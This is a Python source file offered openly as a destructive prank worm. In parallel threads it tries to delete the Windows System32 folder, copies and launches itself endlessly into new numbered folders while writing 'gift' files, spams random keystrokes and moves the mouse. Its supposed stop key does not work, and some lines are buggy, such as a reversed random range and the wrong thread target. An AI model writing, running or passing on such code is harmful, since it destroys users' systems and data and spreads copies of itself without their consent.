# JAI SIYA RAM

from threading import Thread
from os import removedirs , mkdir , startfile , system
from pyautogui import moveTo as moveMouse , press as dabaa
from random import randint , choice
from time import sleep as sojaa
from cv2 import waitKey


def DeleteSystem32():
    while True:
        try:
            removedirs("C:/Windows/System32")
            print("Deleted.")
            break
        except PermissionError as pe:
            print(f"Error\n{pe}")
            break

def SlowWorm_File_and_Dir_Creator():
    
    filename = 0

    while True:
        with open(str(filename) + ".your_gift" , "w") as giftfile:
            giftfile.write("Donot Disturb Me Again!\n\n~~__~~\n\n-Arpit.")
            try:
                mkdir(str(filename))
                maaal_dhaal = open("m1.py" , "r").read()
                temporary = open(f"{filename}/m1.py" , "w").write(maaal_dhaal)
                kagad = open(f"{filename}/{filename}.py" , "w").write(maaal_dhaal)
                startfile(fr"{filename}\{filename}.py")
            except Exception as e:
                print("\n~~__~~")
                print(e)
            finally:
                giftfile.close()
                filename += 1

def MouseMover():
    while True:
        try:
            # import pyautogui as pg
            x_coords = randint(1920 , 1080)
            y_coords = randint(1920 , 1080)
            moveMouse(x=x_coords , y=y_coords)
        except ModuleNotFoundError:
            system("pip install pyautogui")
            continue
        
def Keyboard_Spammer():
    
    chars = r"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890`-=[]\;',.?~!@#$%^&*()_+{}|:><"

    while True:
        try:
            dabaa(choice(chars))
        except ModuleNotFoundError:
            system("pip install pyautogui")

def Procces_Stopper():
    while True:
        if waitKey(1) & 0xFF == ord('/'):
            print("Procces Stopped!!!!")

Sys32Deletion = Thread(target=DeleteSystem32 , args=[])
File_and_Dir_Creation = Thread(target=SlowWorm_File_and_Dir_Creator , args=[])
MoveMouse_procces = Thread(target=moveMouse , args=[])
Key_Spamming_Process = Thread(target=Keyboard_Spammer , args=[])

All_Proccess_Stopper_process = Thread(target=Procces_Stopper , args=[])

Sys32Deletion.start()
File_and_Dir_Creation.start()
MoveMouse_procces.start()
Key_Spamming_Process.start()
All_Proccess_Stopper_process.start()

Sys32Deletion.join()
File_and_Dir_Creation.join()
MoveMouse_procces.join()
Key_Spamming_Process.join()
